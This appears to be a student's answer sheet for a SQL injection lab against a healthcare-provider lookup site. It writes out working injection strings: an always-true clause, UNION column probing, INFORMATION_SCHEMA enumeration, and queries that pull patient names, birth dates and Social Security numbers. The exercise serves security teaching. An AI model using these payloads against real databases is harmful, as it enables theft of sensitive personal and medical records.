# Individual's Name:
1. We get a HTTP Status 500 – Internal Server Error
2. We know that a MySQL database is being used.
3. It shows all the providers in the database
4. We know how the input is being inserted into the program's SQL statement.
5.	String sql =
	select * from general_info2.provider where SPECIALTY = 'ALLERGIST'
	and LNAME like '' or 1=1 or '%' order by LNAME, FNAME, NPI
	
6.HTTP Status 500 – Internal Server Error
7.The database selects more than 3 columns
8. 'union select '1', '2', '3', '4', '5', '6', '7', '8', '9', '10
9. Data from columns 2,4,3,7 show up in a table with NPI, NAME, STATE
														2,   4,3,    7
														
10.Only columns from from 2,4,3,7 will show data
11.' union select '', table_schema, column_name, table_name,
'', '', concat(data_type, ':', privileges), '', '',
'' from INFORMATION_SCHEMA.COLUMNS where 1=1 or '2'='
12. information_schema. general_info2, claims, general_info2
13. ' union select distinct '', table_schema, table_name, '', '', '', '', '', '', '' from INFORMATION_SCHEMA.COLUMNS
where table_schema not in ('information_schema', 'mysql', 'performance_schema') and 1=1 or '2'='
14. Only one pair of distinct combinations were sent.
15. Claims schema with the doctor_claims, hospital_claims, and patients
16. ' union select '', '', column_name, data_type, privileges, '', '', '', '', ''
from INFORMATION_SCHEMA.COLUMNS where (table_schema = 'claims' and table_name = 'patients')
and 1=1 or '2'='
17. SSN looks very interesting
18. ' union select '', ID, First_Name, last_name, '', '', SSN, '', '', ''
from claims.patients where 1=1 or '2'='
19. Provider names and their SSN
20. ' union select '', concat(ID, birth_date), First_Name, last_name, '', '', SSN, '', '', ''  
from claims.patients where 1=1 or '2'='
21. I see the table schemas, data types and priveleges
22. No, because an attacker can still edit the files locally and submit this form to the server.


